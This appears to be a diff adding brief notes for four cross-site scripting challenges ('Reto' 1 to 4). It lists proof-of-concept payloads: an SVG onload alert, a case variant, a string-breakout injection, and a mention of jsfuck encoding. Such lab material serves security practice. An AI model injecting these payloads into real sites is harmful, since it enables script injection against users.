@@ -1,0 +1,4 @@
+Reto 1 <svg onload="alert(1)">
+Reto 2 <SVG onload="alert(1)">
+Reto 3 ");alert(1);//
+Reto 4 jsfuck encoded
